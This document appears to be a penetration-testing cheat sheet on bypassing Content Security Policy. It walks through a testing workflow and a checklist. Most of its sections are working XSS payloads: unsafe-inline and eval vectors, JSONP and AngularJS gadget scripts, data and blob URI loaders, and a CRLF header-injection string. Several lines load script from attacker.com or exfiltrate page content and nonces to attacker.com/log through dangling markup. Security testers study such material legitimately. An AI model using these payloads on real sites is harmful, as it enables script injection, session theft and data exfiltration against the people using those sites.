# Content Security Policy (CSP) Bypass Testing Methodology

## Quick Reference

**Common Bypasses:**
- `unsafe-inline` + `unsafe-eval`
- Whitelisted CDN with JSONP/Angular
- `base-uri` not set
- `script-src` with `*` or `data:`
- CNAME/subdomain takeover

---

## CSP Basics

CSP is a browser security mechanism that restricts resource loading. Key directives:

```
default-src     - Fallback for other directives
script-src      - JavaScript sources
style-src       - CSS sources
img-src         - Image sources
connect-src     - XHR/WebSocket/Fetch
font-src        - Font sources
object-src      - Plugins (Flash, Java)
frame-src       - iframe sources
base-uri        - Base URL for relative URLs
form-action     - Form submission targets
frame-ancestors - Who can embed this page
```

---

## Finding CSP

### Response Header
```
Content-Security-Policy: <policy>
Content-Security-Policy-Report-Only: <policy>
```

### Meta Tag
```html
<meta http-equiv="Content-Security-Policy" content="<policy>">
```

---

## CSP Analysis

### Tools

```bash
# Online analyzers
https://csp-evaluator.withgoogle.com/
https://cspvalidator.org/

# Browser DevTools
Console shows CSP violations
```

### Common Weak Configurations

```
# Too permissive
script-src 'self' 'unsafe-inline' 'unsafe-eval'
script-src *
default-src 'none'; script-src 'self' data:

# Missing directives
# No base-uri → base tag injection
# No object-src → Flash XSS
# No frame-ancestors → clickjacking
```

---

## Bypass Techniques

### 1. unsafe-inline Bypass

If `'unsafe-inline'` present:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### 2. unsafe-eval Bypass

If `'unsafe-eval'` present:
```javascript
eval('alert(1)')
new Function('alert(1)')()
setTimeout('alert(1)', 0)
setInterval('alert(1)', 0)
```

### 3. Whitelisted Domain Exploitation

**JSONP Endpoints:**
If `script-src` allows a domain with JSONP:
```html
<script src="https://whitelisted.com/jsonp?callback=alert(1)//"></script>
```

**Common JSONP endpoints:**
```
accounts.google.com/o/oauth2/revoke?callback=
www.google.com/complete/search?callback=
www.googleapis.com/customsearch/v1?callback=
```

**AngularJS on CDN:**
If Angular CDN whitelisted:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>
```

**React/Vue/Other Libraries:**
Similar techniques with other framework-specific vectors.

### 4. Base-URI Bypass

If `base-uri` not restricted:
```html
<base href="https://attacker.com/">
<script src="/malicious.js"></script>
```

Script loads from `https://attacker.com/malicious.js`.

### 5. Data URI Bypass

If `data:` allowed in `script-src`:
```html
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
```

### 6. Blob URI Bypass

If `blob:` allowed:
```javascript
const blob = new Blob(['alert(1)'], {type: 'text/javascript'});
const url = URL.createObjectURL(blob);
const script = document.createElement('script');
script.src = url;
document.body.appendChild(script);
```

### 7. CNAME/Subdomain Takeover

If CSP allows `*.target.com`:
- Find unclaimed subdomain
- Take over and host malicious script

### 8. Path Bypass

If path restricted:
```
script-src https://example.com/scripts/
```

Try:
```html
<script src="https://example.com/scripts/../other/malicious.js"></script>
<script src="https://example.com/scripts/..%2fother/malicious.js"></script>
```

### 9. Nonce Reuse/Prediction

If nonces are:
- Reused across requests
- Predictable (based on timestamp, session)
- Leaked in response

```html
<script nonce="leaked_nonce">alert(1)</script>
```

### 10. Policy Injection

If CSP header can be injected:
```
Header injection: %0d%0aContent-Security-Policy: script-src 'unsafe-inline'
```

### 11. Script Gadgets

Use existing whitelisted scripts to execute arbitrary code:

```javascript
// If jQuery whitelisted
$.globalEval('alert(1)')

// Prototype pollution leading to XSS
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
```

### 12. SVG with Script

If SVG allowed:
```html
<svg><script>alert(1)</script></svg>
```

### 13. Object/Embed with Flash

If `object-src` allows Flash hosting domain:
```html
<object data="https://attacker.com/xss.swf"></object>
```

---

## Bypassing Strict CSP

### Strict Dynamic

With `'strict-dynamic'`:
- Scripts loaded by trusted scripts are trusted
- Find gadget in trusted script to load attacker's script

```javascript
// If trusted script does:
document.write('<script src="' + userInput + '"></script>')
```

### Hash-Based CSP Bypass

If specific hashes allowed, find collision or:
- CRLF injection to modify script content
- Use DOM clobbering to change script behavior

---

## Report-URI Exploitation

### Information Gathering

CSP violation reports reveal:
- Blocked resources
- Application structure
- Security configurations

### Report Injection

If `report-uri` attacker-controlled:
```
report-uri https://attacker.com/collect
```

Collect all violation reports.

---

## Nonce-Based CSP Bypass

### DOM XSS with Nonce

If nonce present in inline script:
```html
<script nonce="abc123">
  var x = location.hash;
  // DOM XSS here
</script>
```

### Dangling Markup + Nonce Stealing

```html
<img src="https://attacker.com/log?html=
<!-- Rest of page including nonce becomes URL -->
```

---

## Testing Workflow

1. **Identify CSP:**
   - Check headers
   - Check meta tags

2. **Analyze policy:**
   - Use CSP Evaluator
   - Identify weak directives

3. **Test bypasses:**
   - Check for unsafe-inline/eval
   - Test whitelisted domains for JSONP
   - Check for missing base-uri

4. **Exploit:**
   - Craft payload using bypass technique
   - Verify execution

---

## Common Weak Patterns

```
# Overly permissive
script-src 'self' 'unsafe-inline' 'unsafe-eval' https:
script-src 'self' https://cdnjs.cloudflare.com https://www.google.com

# Missing restrictions
default-src 'self'  # No object-src, base-uri

# Wildcards
script-src 'self' *.googleapis.com

# Data URIs
script-src 'self' data:
```

---

## Verification Checklist

1. **Identify CSP:**
   - [ ] Header or meta tag
   - [ ] Report-Only or enforced

2. **Analyze policy:**
   - [ ] Use automated tool
   - [ ] Identify weak directives

3. **Test common bypasses:**
   - [ ] unsafe-inline/eval
   - [ ] JSONP endpoints
   - [ ] CDN frameworks
   - [ ] base-uri missing

4. **Confirm XSS execution:**
   - [ ] Craft working payload
   - [ ] Test in browser

5. **Document evidence:**
   - [ ] CSP policy
   - [ ] Bypass technique used
   - [ ] Working XSS payload
